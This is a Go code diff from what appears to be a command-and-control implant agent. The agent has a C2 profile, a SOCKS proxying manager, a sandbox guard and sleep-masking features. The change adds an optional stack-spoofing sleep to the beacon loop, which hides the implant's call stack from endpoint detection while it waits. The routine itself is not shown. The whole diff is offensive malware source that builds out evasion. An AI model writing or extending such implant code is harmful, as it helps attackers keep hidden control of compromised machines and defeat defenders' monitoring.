@@ -77,6 +77,7 @@ func runAgent() {
 	sandboxGuardEnabled := sandboxGuard == "true"
 	sleepMaskEnabled := sleepMask == "true"
 	guardPagesEnabled := sleepGuardPages == "true"
+	stackSpoofEnabled := stackSpoof == "true" && commands.StackSpoofAvailable()
 	clearGlobals()
 
 	// Initialize command handlers and file transfer goroutines
@@ -131,12 +132,12 @@ checkinDone:
 
 	// Start main execution loop
 	log.Printf("running %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, cfg.maxRetries, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled)
+	mainLoop(ctx, agent, c2, socksManager, cfg.maxRetries, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled, stackSpoofEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("stopped")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool, guardPagesEnabled bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool, guardPagesEnabled bool, stackSpoofEnabled bool) {
 	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
 	taskSem := make(chan struct{}, 20)
 
@@ -173,7 +174,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 							whGuard = guardSleepPages(whVault)
 						}
 					}
-					time.Sleep(sleepDuration)
+					if stackSpoofEnabled {
+						commands.StackSpoofSleep(sleepDuration)
+					} else {
+						time.Sleep(sleepDuration)
+					}
 					if sleepMaskEnabled {
 						if guardPagesEnabled {
 							unguardSleepPages(whGuard, whVault)
@@ -277,6 +282,8 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				if !guardedSleep(sleepTime) {
 					sleepSkipped = true
 				}
+			} else if stackSpoofEnabled {
+				commands.StackSpoofSleep(sleepTime)
 			} else {
 				time.Sleep(sleepTime)
 			}
